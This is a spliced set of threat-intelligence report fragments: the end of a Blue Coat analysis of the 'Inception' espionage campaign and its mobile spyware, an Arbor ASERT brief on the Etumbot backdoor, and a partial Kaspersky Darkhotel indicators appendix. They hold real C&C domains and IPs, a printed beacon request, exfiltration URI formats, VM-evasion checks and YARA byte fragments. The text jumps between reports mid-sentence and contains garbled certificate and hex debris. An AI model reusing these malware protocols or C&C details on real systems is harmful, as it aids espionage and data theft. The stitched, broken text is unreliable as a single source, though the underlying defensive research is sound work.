operators are targeted is not complete.We managed to get 66 of a total of 190.The ones we know of are shown below.A full breakdown of mobile operators
and related links is included in the appendix.36
The composition of links created for the various mobile operators is quite
interesting, as one can speculate that they represent amount of actual or planned
attacks in different countries.With the top three operators being Vodafone, T-
Mobile and Proximus (Belgacom) it seems these apparent phishing attacks are
less focused on the Russian sphere than the previously discussed malware.This map is not complete, though.It represents only about 35% (66/190) of all
mobile operators targeted and 66% (3152/4781) of all phishing links we managed
to harvest.In addition, some operators like Vodafone are global actors, so the
map might show an unfair intensity in their HQ locations.MMS phishing heat map


The rest of the bit.ly links used the action codes 743 or 1024.And now things
really get interesting.By using mobile device HTTP User-Agents we were able to
trigger downloads of malware components from some of these links.37
Mobile malware: Android


Accessing the link from an Android User-Agent initiated a download of an
Android installer package named WhatsAppUpdate.apk.The package we
analyzed was 1.2MB in size.The apparent main purpose of this malware is to record phone call audio.Recordings are stored as *.mp4 files, and uploaded to the attackers periodically.The malware is able to collect a lot of other information, not all of which is
actually used:

   •   Account data
   •   Location
   •   Contacts
   •   External and Internal Storage (files written)
   •   Audio (microphone)
   •   Outgoing calls
   •   Incoming calls
   •   Call log
   •   Calendar
   •   Browser bookmarks
   •   Incoming SMS

Through the encrypted C&C protocol, the attackers can issue commands and
binary updates to the malware.It uses a custom DAO/Database scheme which uses accounts belonging to the
virtual community Live Journal (livejournal.com) as data stores.Three such
accounts were found hardcoded in the package:




The accounts all state that they belong to Iranian users.This is very likely false.38
The text in these posts starts first out in cleartext, but quickly turns into
unreadable gibberish.The HTML source code reveals that the encoded portion is
encapsulated in blog-index tags:




The three accounts contain different configuration blocks pointing to C&C servers
apparently located in Poland, Germany and Russia, respectively.Based on
registration data and folder configuration we believe these are legitimate but
compromised Joomla servers.And then an unexpected oddity shows up in the Java source:




The sign in front of SizeRandomStr is “Truti” - a Hindi word meaning “Error”.39
We were also able to download a similar malware sample (BrowserUpdate.apk)
from one of the C&C servers.This sample used different online accounts for its
DAO/database functionality, but is otherwise quite similar to the first.40
Mobile malware: Apple IOS


Using an IOS User-Agent triggered the download of a Debian installer package,
WhatsAppUpdate.deb, also 1.2Mb in size.This application impersonates a Cydia installer, and can only be installed on a
jailbroken phone.41
These data are encrypted and uploaded to an FTP account which is taken from
an encrypted configuration file named /usr/bin/cores.In this particular case, the FTP account is located on a legitimate (if struggling)
hosting service in the UK.In this case, there’s another clue:




The project path in the package contains the name JohnClerk.The WhatsAppUpdate project seems derived from an earlier template named
SkypeUpdate.42
Mobile malware: Blackberry


By now, it came as no surprise when we triggered a download with a BlackBerry
User-Agent.The initial download was a Java Applications Descriptor, a text file
designed for Over-The-Air installation of Java-based applications.This JAD file
contained the locations of the two Blackberry *.COD binaries which we then
could download directly.The application impersonates a settings utility.43
“God_Save_The_Queen” is used as a reference in one of the Blackberry
binaries.Since these COD files are also compiled Java code, they are possible to
decompile to original source code.In a similar fashion to the Android version, we
find interesting strings there.This time they are in Arabic:




“Reading files” in Arabic




                                                                             44
PART IV:

Attribution




              45
Timelines and activity patterns

The earliest sample of Inception-related malware we have been able to obtain,
was submitted to us in June 2014.However, decoy document metadata shows
that it was created late May.The related cloud account was created just before
that.An examination of the other documents associated with the attacks show
that they have been created at a steady pace all through summer and autumn
2014 and attacks are still ongoing.Of interest is also the attackers’ activity patterns over the 24h cycle.The main
upload of new components to shares seems to be divided over two high–activity
periods: 6:00 -10:00 UTC and 17:00 - 21:00 UTC.No uploads were seen
between 23:00 and 05:00 UTC.It is however doubtful how indicative these timeframes are.To illustrate, we
looked into another and more obscure timing factor: The timing of the AES
InitVector random seeds.A random seed is the initial value passed into a
pseudo-randomizer function.The malware uses the random output to create
what is known as an InitVector - a starting point for the AES
encryption/decryption function.The code used in some of the DLLs indicate that the attackers tend to use the C
time() function to generate random seeds.This function returns values of
granularity down to seconds.Thus random seeds, and ultimately the InitVectors,
are functions of these quite coarse units of time.The encrypted files uploaded to the WebDAV shares come with their InitVectors
stored at the end of the file.Since we know the time window to be within a few
days of the upload time we were able to brute force the time values that would
generate the corresponding InitVectors.Thus, we were able to say to the second
when the file was created – and most times were identified to be in the range
1500 - 2200 GMT.Unfortunately, we had to reject these data.The file creation times turned out to
be hours after the files themselves were uploaded to the WebDAV share.Either
the attackers’ system clock is wrong or a fixed offset is added to the random
seed.Either way, the data can’t be trusted; and shows that nothing can be taken
at face value.46
The Chinese connection

On at least two occasions during our surveillance of the Inception framework, the
malware downloaded something unexpected and wholly different from what we
have discussed until now.These files were downloaded as encrypted *.bin files from the accounts
carter0648 and frogs6352.When decrypted, these turned out to be dropper
packages containing one dropper executable clearly created for the Inception
framework, and one other, very different executable.This executable, (sccm.exe, md5 dd8790455109497d49c2fa2442cf16f7) is a
classical Chinese APT implant.It is a downloader and remote shell program,
designed to connect to a C&C server to interact with the attacker and/or
download more malware.The C&C server in this case is ict32.msname.org.This development was unexpected for several reasons.First of all, it apparently
breaks the strict, obfuscatory operational security built into the Inception
framework.Inception has the capacity to perform all steps needed for scouting
out and exfiltrating data without resorting to traditional hosted command &
control.By using a well-understood APT tool and a known malicious C&C
domain name, the attackers permit much clearer attribution.47
Another factor which is out of character is the coding style.All Inception-related
malware is written using Visual Studio 2010.The downloaded sccm.exe is written
using Visual C++ 6; and has a PE header compile date of October 2010.This date can be forged, and indeed, all Inception-related malware has some
level of forgery in the compile dates.However, the sccm.exe compile date
matches the Quarian developer toolset and coding style to a better degree than
the other files distributed through Inception.Then there is the C&C domain used.According to DomainTools.com the
msname.org domain registration timed out September 27th 2014.It was left
inactive and was not renewed until Nov 12th.This means that the attackers
distributed malware that would be out of action for a long time (last distribution of
sccm.exe was September 26th).Because of all this we consider sccm.exe as an unreliable indicator.It is likely to
be a red herring purposefully placed on shares where the attackers have seen
signs of access by security researchers.An odd indicator

At one instance the attackers seem to have slipped up.Instead of using their
scheduled task, they apparently did something manually on a WebDAV share.This is visible because the request came from an apparent attacker IP, but used
yet another User-Agent: “gvfs/1.12.3”.Gvfs is the virtual filesystem for Gnome desktop.The action on the account was
abnormal as well; an apparent file upload:

83.53.147.144 - - [02/Sep/2014:09:53:56 +0200] "PUT
/tem5842/Documento%20sin%20t%C3%ADtulo HTTP/1.1" 408 0 "-"
"gvfs/1.12.3"

“Documento sin título” means “Untitled document” in Spanish.When WebDAV shares are mapped up as drives by the operating system, any
action taken by the attacker follows the same pattern as on the attacker’s local
drive.In the case above, it seems the attacker attempted to edit a new
document, which by default is given the name “Untitled document” in Gnome.This might indicate that the attacker’s operating system language is Spanish.Of course, Spanish is one of the world’s most widespread languages, so one
cannot infer much from this.There is even a small possibility that the
phenomenon is a pure artifact; for example that a Spanish-speaking researcher
connected to the same account using the same Linux-based setup as the
attackers.48
Similarities with Red October


This attack system shares a number of properties that are somewhat similar with
the Red October campaigns detailed by Kaspersky Labs in 2013.For more information about this see:

The "Red October" Campaign - An Advanced Cyber Espionage Network
Targeting Diplomatic and Government Agencies

       -   Target countries and verticals overlap to some extent
       -   The topics of some decoy documents are the same (eg.“Diplomatic
           Car for sale”)
       -   Similar overall loading architecture, with dropping of encrypted binaries
           that are later decrypted and loaded
       -   Exploited documents contain certain similarities (i.e.the magic string
           “PT@T” used as a marker to locate the shellcode)


However, there are also clear differences.The code is fully rewritten; there
appears to be little code overlap, at least in the initial stage malware.The coding
style is different, with different solutions to programmatic problems, different use
of exception handling, and different use of C++ classes.It’s hard to believe that
the same programmers are responsible for the two code bases.The Red October malware contained linguistic markers that pointed towards
Russian speaking attackers.No such clues have been found in the Inception-
related malware; there is a marked difference in the attention to detail and
information leakage.It is certainly possible that the same people have organized both Inception and
Red October, but there are no clear indications to this effect.49
Strings in malware


The Windows-based malware in this paper generally contains very few
noticeable strings apart from what is commonly found in software, and clearly
randomized strings.What exists – like the word “polymorphed” in the early DLL
versions - is standard English with few discerning features.This changes a bit when we look at the mobile malware.In the Android malware
we find Hindi comments in the Java source code.In the Iphone malware we find
project paths referencing one “JohnClerk”, and a few typos like “conutry”.In one
of the Blackberry binaries we find the string “God_Save_The_Queen”, a rather
blunt hint towards Britain, as well as Arabic log strings.These and other indicators have led us to conclude that the Inception attackers
are setting a new standard for deliberate disinformation and red herrings in a
malware espionage operation.Some clues might have been added by accident,
but none of these indicators can be trusted in any way.Thus we are not going to
assume anything about who might be behind these attacks.50
              Conclusion


              The whole Inception setup shows signs of automation and seasoned
              programming.The amount of layers used in this scheme to protect the payload
              of their attack seems excessively paranoid.Not only is the initial DLL apparently
              polymorphed using some backend tool – the compile time stamps in the PE
              header are clearly forged, resources are removed so as not to give away any
              location information, and import tables are shuffled around, rendering import
              hashes (aka imphashes) useless.The names of the files both when dropped and their original names along with
              the callback directories, paths and mutexes used all seem to be dynamically
              generated.The attackers utilize compromised embedded devices – typically routers- on the
              Internet as well as multiple dedicated hosting providers and VPN services to
              mask their identity from the cloud storage provider and others.The same router
              botnet is used as a spreading and management platform for attacks on mobile
              devices as well.This suggests that this a large campaign and we’ve only seeing the beginning of
              it.Initially many of the targets were located in Russia or related to Russian
              interests, but as the campaign has evolved we have verified targets in countries
              all over the world.It is clear that this infrastructure model does not need to be applied solely against
              a few targets, or even need to be hosted at CloudMe.The framework is generic,
              and will work as an attack platform for a multitude of purposes with very little
              modification.The attribution indicators point in different directions and can’t be given much
              weight.These attacks can in theory be the creation of nation states or
              resourceful private entities - we consider it very unlikely that they are performed
              by one or just a few individuals.© 2014 Blue Coat Systems, Inc. All rights reserved.Blue Coat, the Blue Coat logos, ProxySG, PacketShaper, CacheFlow, IntelligenceCenter, CacheEOS, CachePulse, Crossbeam,
K9, the K9 logo, DRTR, Mach5, Packetwise, Policycenter, ProxyAV, ProxyClient, SGOs, WebPulse, Solera Networks, the Solera Networks logos, DeepSee, “See Everything.Know
Everything.”, “Security Empowers Business”, and BlueTouch are registered trademarks or trademarks of Blue Coat Systems, Inc. or its affiliates in the U.S. and certain other
countries.This list may not be complete, and the absence of a trademark from this list does not mean it is not a trademark of Blue Coat or that Blue Coat has stopped using the
trademark.All other trademarks mentioned in this document owned by third parties are the property of their respective owners.This document is for informational purposes
only.Blue Coat makes no warranties, express, implied, or statutory, as to the information in this document.??????8B 4D 08 8B   11   C7   42   14   00   00 00   00
            8B 45 08 8B 08 8B 55 14 89 51 18 8B   45   08   8B   08   8B   55 0C   89
            51 1C 8B 45 08 8B 08 8B 55 10 89 51   20   8B   45   08   8B   08}
            $d = {68 10 27 00 00 FF 15 ????????83   7D   CC   0A   0F 8D   47
            01 00 00 83 7D D0 00 0F 85 3D 01 00   00   6A   20   6A   00   8D 4D   D4
            51 E8 ????????Big thanks to all.CIRCL.LU
Crowdstrike
F-Secure Corporation
iSight Partners
Kaspersky Labs
Symantec Corporation


We also owe a big debt of gratitude to Ryan W. Smith of Blue Coat who helped
us tremendously with the analysis of the mobile malware.62 Arbor Threat Intelligence Brief 2014-07 
 

ASERT Threat Intelligence Brief 2014-07 
Illuminating the Etumbot APT Backdoor 
ASERT Threat Intelligence, June 2014 
Etumbot is a backdoor used in targeted attacks since at least March 2011.Although 
previous research has covered a related family, IXESHE, little has been discussed 
regarding Etumbot’s capabilities.ASERT has observed several Etumbot samples using 
decoy documents involving Taiwanese and Japanese topics of interest, indicating the 
malware is used in ongoing, targeted campaigns.This report will provide information on 
the capabilities of Etumbot and associated campaign activity.Etumbot Capabilities and Techniques 

Etumbot is a backdoor malware that has been associated with a Chinese threat actor group alternatively 
known as “Numbered Panda”, APT12, DYNCALC/CALC Team, and IXESHE.Targeted campaigns 
attributed to this group include attacks on media, technology companies, and governments.IXESHE/Numbered Panda is known for using screen saver files (.scr), a technique repeated with the 
Etumbot malware.[1] A previous campaign using IXESHE malware was highlighted in 2012; the group 
used targeted emails with malicious PDF attachments to compromise East Asian governments, 
Taiwanese electronics manufacturers, and a telecommunications company.The group has reportedly 
been active since at least July 2009.[2] Etumbot has also been referred to as Exploz [3] and Specfix.The variety of names for this malware could lead to some confusion about the actual threat.ASERT has 
associated Etumbot with IXESHE, and therefore Numbered Panda, based on similar system and network 
artifacts that are common between the malware families.For example, both malware families have been 
seen using the same ka4281x3.log and kb71271.log files, both families have been observed calling back 
to the same Command & Control servers and have been used to target similar victim populations with 
similar attack methodologies.Etumbot has two primary components.The first is a dropper which contains the backdoor binary (the 
second component) and the distraction file.Stage one is likely delivered via spear phish using an archive 
file extension such as .7z to deliver executable content.Stage one has been seen to leverage the 
Unicode Right to Left Override trick combined with convincing icons for various types of PDFs or 
Microsoft Office documents to convince the user to click and therefore execute the malware, which then 

© Copyright 2014 Arbor Networks, Inc. All rights reserved.Arbor Security Report: ASERT Threat Intelligence Brief 2014-07 

runs the backdoor and displays the distraction file.As with the IXESHE malware, Etumbot has been 
observed dropping documents of interest to a Taiwanese and Japanese target population.Stage 1: Installer/Dropper 
To profile the techniques and capabilities of Etumbot, we will analyze an Etumbot dropper with MD5 
ff5a7a610746ab5492cc6ab284138852 and a compile date of March 4, 2014.When executed, the dropper loads up a resource named "BINARY" from the resource section then 
creates the directory C:\Documents and Settings\User\Application Data\JAVA, then creates a temporary 
file C:\DOCUME~1\User\LOCALS~1\Temp\ka4281x3.log then creates C:\Documents and 
Settings\User\Application Data\JAVA\JavaSvc.exe from the aforementioned BINARY resource.This file, 
JavaSvc.exe, is the backdoor component (MD5 82d4850a02375a7447d2d0381b642a72).JavaSvc.exe is 
executed with CreateProcessInternalW.The backdoor component of the malware (named here as 
JavaSvc.exe) is now running.It is interesting to note that versions of the IXESHE malware also used 
JavaSvc.exe as a filename.Most Etumbot samples observed by ASERT drop decoy documents (PDFs, Word Documents, and Excel 
Spreadsheets) written in Traditional Chinese and usually pertaining to Cross-Strait or Taiwanese 
Government interests.Several decoy files contain details on upcoming conferences in Taiwan.Spear Phishing 
Etumbot appears to be sent to targets via spear phishing emails as an archive; ASERT has observed .7z 
and .rar formats being used to presumably deliver the Etumbot installer.The archive filename will have a 
topic most likely of interest to the victim.At least one identified malware sample (75193fc10145931ec0788d7c88fc8832, compiled in March 2014) 
uses a password-protected .7z to deliver the Etumbot installer.It is most likely that the spear phish email 
contained the password.With the correct password, the victim has access to the dropper inside the archive.This archive most 
likely included the installer d444be30d2773b23de38ead1f2c6d117, as the filenames match (1030522 新

 

2 

Proprietary and Confidential Information of Arbor Networks, Inc. 

 

Arbor Security Report: ASERT Threat Intelligence Brief 2014-07 

機關籌備小組清單.7z and 1030522 新機關籌備小組清單 rcs.DOC).1030522 is a date (May 22, 2014) 
from the Minguo calendar, which is unique to Taiwan.The calendar is based on the establishment of the 
Republic of China in 1911.2014 is therefore the “103rd” year of the ROC.The installer is a .scr binary 
posing as a Word Document.This dropper drops a decoy document and the backdoor, named 
sysupdate.exe in this instance.Right-to-Left Override 

After the files are extracted from the archive, the filenames of Etumbot installers make use 
of the right-to-left override (RTLO) trick in an attempt to trick users into clicking on the 
installer.The RTLO technique is a simple way for malware writers to disguise names of 
malicious files.A hidden Unicode character in the filename will reverse the order of the 
characters that follow it, so that a .scr binary file appears to be a .xls document, for 
example.Threat actors using this trick have been well documented since at least 2009.[4-
5] One way to avoid this trick in Windows is to set the “Change your view” level to “Content”.kb71271.log is 
then deleted.These temp files appear to be static and used across multiple samples of Etumbot and 
IXESHE.Various other samples were found using this same naming scheme.Next, C:\DOCUME~1\User\LOCALS~1\Temp\ka4281x3.log is created, filled with contents of the 
bait/distraction file, and then copied to C:\DOCUME~1\User\LOCALS~1\Temp\~t3fcj1.doc, which is then 
opened.If Word isn't installed, then notepad will open the file instead.The ka4281x3.log file is then 
deleted.Returning to the first sample, once the dropper (ff5a7a610746ab5492cc6ab284138852) installs the 
Etumbot backdoor (82d4850a02375a7447d2d0381b642a72), an initial HTTP beacon is sent to the 
Command & Control server that requests an RC4 encryption key.The beacon takes the form of a GET 
request to /home/index.asp?typeid=N where N is a randomly selected odd number between 1 and 13.If 
the C&C is online, the decoded response payload will contain the RC4 key that is used to encrypt 
subsequent communication.If the C&C does not send a valid response, the bot will re-send the initial request every 45 seconds.© Copyright 2013 Arbor Networks, Inc. All rights reserved.3 

Arbor Security Report: ASERT Threat Intelligence Brief 2014-07 

While the user-agent may appear to be legitimate, it only occurred 39 times in a corpus of over 61 million 
HTTP requests.Due to the possibility of this User-Agent appearing in legitimate traffic, other indicators – 
such as the additional fake Referer value of http://www.google.com should be present before compromise 
is assumed.All of the headers in the HTTP request are hard-coded in both order and value, so they may 
be used to provide additional indicators of compromise.If the C&C is online and responds to the beacon, then the RC4 key is delivered to the bot in a string of 
base64 encoded characters.Etumbot uses a url-safe base64 alphabet, i.e., any characters that would 
require URL-encoding are replaced.Usage of base64 is a technique consistent with previous analysis 
done on IXESHE malware.[2,7] In the case of Base64, the “/” and “=” characters are replaced with “_” 
and “-“ respectively.The payload from the C&C contains an 8-byte command code in little-endian format, 
followed by a null-terminated string argument if the command requires it.In the case of the initial beacon 
response, the RC4 key is located after the command code and has been observed to be e65wb24n5 for 
all live C&C’s that ASERT has analyzed.An example of this initial beacon and delivery of RC4 key is as follows.Once the bot has received the encryption key, the bot sends a registration callback to the C&C 
/image/<encrypted data>.jpg containing the encrypted values of system information to include the 
NetBIOS name of the system, user name, IP address, if the system is using a proxy (Yes/No), and a 
numeric value which may be some type of campaign code.IXESHE malware has also been observed 
using a unique campaign code that is delivered back to the C&C.[7]  

© Copyright 2013 Arbor Networks, Inc. All rights reserved.5 

Arbor Security Report: ASERT Threat Intelligence Brief 2014-07 

Etumbot discovers the proxy settings of the local machine.If a proxy is defined, communications to the 
C&C bypass the proxy and go directly to the Internet.Environments with system-defined proxies won’t get 
this activity in proxy logs, however transparent proxies may see this activity.A contrived example of this registration string generated by the Etumbot backdoor prior to encryption is as 
follows: 

WINXPBOX|johnsmith|10.0.1.15|No Proxy|05147| 

A bot registration call to /image 

Once the bot has registered with the C&C, it will send periodic pings to ask for new commands to 
execute.The URI for the ping requests is /history/<encrypted NetBIOS name>.asp, where encrypted 
NetBIOS name is the url-safe base64 encoding of the rc4-encrypted NetBIOS name.6 

Proprietary and Confidential Information of Arbor Networks, Inc. 

 

Arbor Security Report: ASERT Threat Intelligence Brief 2014-07 

 
Etumbot Command Structure 
The first eight bytes of C&C responses to the bot include the command, and the second eight bytes 
contain an ASCII string that is parsed.In the event of a file download, file upload, or command execution, 
the second eight bytes contain the filename or command to be executed.Both stdout and stderr from the command are redirected to a pipe and are then relayed back to the 
C&C using a separate thread that spawned during initialization.In the event of a process creation or hang 
error, an HTTP transaction to /tech/s.asp/m=<message> is sent to the C&C, where <message> contains 

© Copyright 2013 Arbor Networks, Inc. All rights reserved.7 

Arbor Security Report: ASERT Threat Intelligence Brief 2014-07 

a create process error statement “CreateProcess Error: %d” or a message that states “Process Do not 
exit in 10 second, so i Kill it!”.Some samples of droppers have been observed using the string “Process 
Do not cunzai in 10 second, so i Kill it!”.The word "cunzai” is likely the pinyin (romanization) for the 
Mandarin word 'exist'.ETUM_CMD_PUTFILE provides the capability for files to be placed on local system from the C&C.The 
file upload is accomplished by sending a request to /docs/name=<data> and the C&C is expected to 
respond with the full contents of the file as the response payload.A success or failure status message is relayed via a call to /tech/s.asp?m=<encrypted status message> 
with various reasons for failure potentially being relayed.ETUM_CMD_READFILE allows any file from the compromised system to be uploaded to the C&C.When 
a READFILE command is received from the C&C, the bot makes an initial call to 
/manage/asp/item.asp?id=<encrypted computer name>&&mux=<encrypted total file size> and checks for 
the presence of “I’m Ready” in the response from the C&C.Data from the file is read in 2000 byte chunks, 
RC4 encrypted and then url-safe base64 encoded.The data is sent back to the C&C via the URI 
/article/30441/Review.asp?id=<encoded computer name>&&date=<file chunk data>.The bot expects a 
message of “OK” from the C&C after each response is sent and will terminate the upload and send an 
error message to the C&C in the case it is not seen.A success or failure message is sent via the 
/tech/s.asp?m=<encrypted status message> to complete or terminate the upload.ETUM_CMD_SLEEP puts the bot into a dormant state for a period of time.When a bot receives the sleep 
command, it will relay the message, “I will sleep %d minutes!” via a call to /tech/s.asp?m=<encrypted 
message>.ETUM_CMD_UNINSTALL deletes the binary and terminates the process with no additional 
communication to the C&C.Use of Byte Strings Technique (aka “String Stacking”) 
Etumbot uses a technique to load strings into memory that has been called “byte strings” and also “string 
stacking” whereby character values are loaded into a specific memory location one byte at a time.Assuming the string values do not change frequently, these byte strings can make for meaningful 
detection capabilities, such as discovering an unusual combination of characters (to include typos, unique 
or odd syntax) being loaded into memory that creates a unique fingerprint for the malware activity that 
can be used as part of a yara rule or other detection mechanism.The byte string technique has been 
observed in various Chinese APT malware, including Gh0st RAT, IXESHE malware, Etumbot and others.ASERT has provided an IDApython script that will provide for cleaner analysis of such strings as well as a 
corresponding blog entry that describes the obfuscation technique and code.[8-9] 

The output of running find_byte_strings.py on an Etumbot backdoor shows the string “I’m Ready” which is 
involved in file transfer routines.The first screenshot shows the default hex byte values that are MOVed 
into offsets from EBP, and the second screenshot shows those same characters after translation to string 
values.8 

Proprietary and Confidential Information of Arbor Networks, Inc. 

Arbor Security Report: ASERT Threat Intelligence Brief 2014-07 

 

 

 

 

 

 

 

 

© Copyright 2013 Arbor Networks, Inc. All rights reserved.9 

Arbor Security Report: ASERT Threat Intelligence Brief 2014-07 

Two additional screenshots provide insight into all of the strings discovered.The byte string technique has also been observed in other malware, so its presence alone does not 
specifically indicate the activities of Chinese threat actors.An interesting artifact occasionally observed during analysis is the presence of a numeric value just after 
an IP address used as a C&C.The placement of this number after a colon suggests the use of a port 
value, however such a port value is too high to be valid.File	
  is	
  stored	
  in	
  C:\Windows\system32\,	
  
\Documents	
  and	
  Settings\<username>	
  or	
  elsewhere	
  
Similar	
  in	
  format	
  to	
  the	
  prior	
  filename,	
  this	
  has	
  only	
  
been	
  observed	
  in	
  Etumbot	
  samples.11 

Arbor Security Report: ASERT Threat Intelligence Brief 2014-07 

Etumbot Command and Control Indicators 
Most instances of Etumbot that were analyzed connect directly to an IP address with the IP address 
hardcoded in the binary.These C&C’s were obtained from analyzing malware samples compiled over a 
period of several years.The 
domain finance[.]yesplusno[.]com and IP address 
211[.]53.164.152 was also used by a variety of 
IXESHE samples, for instance.The registrant for the 
domain yesplusno[.]com is listed as “alice yoker” with 
the email address “chuni_fan@sina.com”.Other 
domains registered in this name have also been used 
as C&C for IXESHE:  

securezone[.]yesplusno[.]com [10] 
prishmobile[.]googlesale[.]net 
yahoopush[.]googlesale[.]net 

The IP address 98.188.111.244 has also been used as 
a C&C for multiple IXESHE samples, beginning in at 
least March 2013 and observed as recently as March 

2014 with an Etumbot sample.This is the IP address for what appears to be a legitimate website for a 
school in Taiwan: intro.sunnyschool.com.tw.Note that if HTran or other connection bouncer is used, the 
C&C may be a legitimate site that was simply compromised and used to direct traffic elsewhere.Miscellaneous Network Artifacts: Use of Htran Connection Bouncer 
Indicators suggest that HTran, a connection bouncer, is being used in some cases such as on the C&C 
contacted by malware sample MD5: 1ce47f76fca26b94b0b1d74610a734a4 (compilation date March 12, 
2014).[11] HTran is designed to redirect 
TCP traffic intended for one host to another, and has been used by IXESHE malware previously.[2] 

Researchers at SecureWorks determined some years back that HTran would deliver the IP address of 
the final destination server if the final server were down or unreachable.The code in use here has been 
modified to not reveal such information.Organizations properly positioned with netflow or other traffic 
analysis capabilities may be able to locate upstream servers from HTran nodes that operate as the initial 
tier of C&C.The first identified sample 
has a compilation date of March 2011, while the most recent was compiled in May 2014.Many 
droppers/installers contain Etumbot or, alternatively, IXESHE-related backdoors.Most of the documents dropped with Etumbot are written in traditional Chinese.Traditional Chinese 
(versus simplified Chinese used in mainland China) is most widely used in Taiwan.While other areas do 
make use of traditional Chinese (Hong Kong, Macau), the topics of the decoy documents strongly 
suggest that Taiwanese entities are the targets for many Etumbot samples.A recent increase in Etumbot samples with configuration dates of 2014 seems to indicate that the 
Numbered Panda/IXESHE group has increased activity lately or has begun using Etumbot more widely in 
targeted campaigns.2011 

ac22aa007081caeb8970aefba7eddfcf 
Compilation Date: 2011-03-09 14:10:34 
C&C: N/A 
Filename: Help statement from western U.S ?cod.scr 
Archive: HelpXstatementXfromXwesternXU.SX.rar (c2d667b8072aa2eaa670d4459dd7c90d) 
Dropped Files: ~$workp.doc (7ec4ece7358f9f67a4d583777dc1fb59), ka4281x3.log, kb71271.log, WINCHAT.EXE 
(70424b91dc905e4ca5e4aeb1c62ed91f) 

 
 
 
 
 

© Copyright 2013 Arbor Networks, Inc. All rights reserved.13 

Arbor Security Report: ASERT Threat Intelligence Brief 2014-07 

~$workp.doc: News article on recent Chilean earthquake (English) 

 

 
cd33c5467d425f662f57672531701d89 
Compilation Date: 2011-03-14 02:49:22 
C&C: N/A 
Filename: N/A 
Dropped Files: ~$workp.doc (731f288ebd8ff05b3a32377d9d7f4751), WINCHAT.exe 
(e62453f41af9d87b4f6d4e8223926024) 

~$workp.doc: Notice from TEPCO (Tokyo Electric Power Company) dated March 14 about 

emergency shortage and blackouts.(Japanese) 

 

 
04908c6853cb5c9d7dccaf15fb5fd3bb  
Compilation Date: 2011-03-24 03:24:42 
C&C: 32.114.251.129 (US), 217.119.240.118 (RS), 202.106.195.30 (CN) larry[.]yumiya[.]com 
Filename: N/A 
Dropped Files: ~PG7953.doc (adc0ffd684d9a986d65cb4efba39c3fe), ka3157jl.log, kb71271.log, iexplore.exe 
(37648553f4ee6c5cb712cca446340a9a) 

© Copyright 2013 Arbor Networks, Inc. All rights reserved.15 

Arbor Security Report: ASERT Threat Intelligence Brief 2014-07 

~PG7953.doc: “qqqqqq” 

 

 
88653dde22f723934ea9806e76a1f546 
Compilation Date: 2012-12-05 01:30:07 
C&C: 190.193.44.138 (AR), cht[.]strangled[.21 

Arbor Security Report: ASERT Threat Intelligence Brief 2014-07 

beb16ac99642f5c9382686fd8ee73e00 
Compilation Date: 2014-03-31 07:34:00 
C&C: 143.89.47.132 (HK) 
Filename: 10342 委會-審查金融法規修正草案報告 rcs.xls 
Dropped Files: ~tkfad1.xls (eef5f9b46676b31a791216b42360c8bb), ka4a8213.log, kb71271.log, Googleupdate.exe 
(e7d960060d602deb53c7d49d2002c4a4) 

 

~tkfad1.xls: Filename  (Traditional Chinese) pertains to April 2 meeting of unnamed Commission about 

financial regulation amendments.Document format is unreadable 

 
5340fcfb3d2fa263c280e9659d13ba93 
Compilation Date: 2014-04-23 01:23:41 
C&C: 196.1.99.15 (SN), wwap[.]publiclol[.]com 
Filename: 報價單 Finarcs.xls 
Dropped Files: ~tasyd3.xls (c5118ba47b7aa12d6524f648f1623cc1), ka4a8213.log, kb71271.log, winlogdate.exe 
(ba4f88fe44d02a299dbeab18c37f74f3) 

 

~tasyd3.xls: Filename “price list” (Traditional Chinese).Document format is unreadable.ASERT engineers and researchers are part of an elite group of institutions that are referred to as “super 
remediators,” and represent the best in information security.This is a reflection of having both visibility 
and remediation capabilities at a majority of service provider networks globally.ASERT shares operationally viable intelligence with hundreds of international Computer Emergency 
Response Teams (CERTs) and with thousands of network operators via intelligence briefs and security 
content feeds.ASERT also operates the world¹s largest distributed honeynet, actively monitoring Internet 
threats around the clock and around the globe via ATLAS®, Arbor's global network of sensors: 
http://atlas.arbor.net.This mission and the associated resources that Arbor Networks brings to bear to 
the problem of global Internet security is an impetus for innovation and research.To view the latest research, news, and trends from Arbor, ASERT and the information security community 
at large, visit our Threat Portal at http://www.arbornetworks.com/threats/.© Copyright 2013 Arbor Networks, Inc. All rights reserved.25Darkhotel
Indicators
of Compromise
For more information, contact intelreports@kaspersky.com


Version 1.0
November, 2014




Global Research and Analysis Team
2


Contents
Appendix A - related md5s .....................................................................................3
   Downloaders, injectors, infostealers ...............................................................3

Appendix B.Bhd., OU=457608K,
        CN=Digisign Server ID (Enrich)
        Validity
           Not Before: Mar 29 04:26:21 2010 GMT
           Not After : Mar 29 04:26:21 2012 GMT
        Subject: C=MY, O=Digicert Sdn.Bhd., CN=mcrs2.digicert.O..a!..dc..0.1.0...U....Root Agency...7l...d......\5.If it exists the module exits, if not ­the
module creates one.The module implements a method to resist running in virtual environment.It gets
CPU name and identifier from the registry at HKLM\HARDWARE\DESCRIPTION\
System\CentralProcessor\0
and collects IP and MAC addresses of local network adapters.After that it
compiles a string describing the system in the following format: « C P U :
%CPUNAME%<br> Net card : %IP% (%MACADDR%)<br>».Next it checks if this
string contains one of the following substrings:
•	 	«VMWARE»
•	 	«QEMU»
•	 	«192.168.100.»
If any of these strings is found, the module terminates.After that, there is a hardcoded value of 10, which delays further execution of the
module for 10 seconds.Then the module attempts to delete some other, prob-
ably older, components which might be present on the system.The list of deleted
files includes the following:
•	 	%APPDATA%\Microsoft\Crypto\DES64v7\dtlcntr.exe
•	 	%APPDATA%\Microsoft\Crypto\DES64v7\googletoolbar.exe
•	 	%APPDATA%\Microsoft\Crypto\DES64v7\active.dll
•	 	%APPDATA%\Microsoft\Crypto\DES64v7\detect.dll
The next is step is to check if current directory has a file named «U».If not, the
module proceeds with network communication routine.But if this file is found it
does some additional checks.If «U» file is older than 180 days, the module wipes


TLP: Green	               For any inquiries, please contact intelreports@kaspersky.com
                                                                                  59


the file.If not, it triggers a special variable that makes module dormant and dis-
ables further communication with C&C server.After all, if the module is ready and allowed to communicate with C&C server it
does that in the following manner.1.The module connects to autolace.twilightparadox.com (or automachine.servequake.com) and issues a HTTP GET request with hardcoded User­Agent
    string:
    GET /major/images/view.php HTTP/1.1
    User­Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0;
    SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;
    Media Center PC 6.0)
    Host: autolace.twilightparadox.com
    Connection: Keep­Alive
    Cache­Control: no­cache

    The server response should contain «DEXT87» string which is used to rec-
    ognize valid response.The malware locates «DEXT87» and reads the data
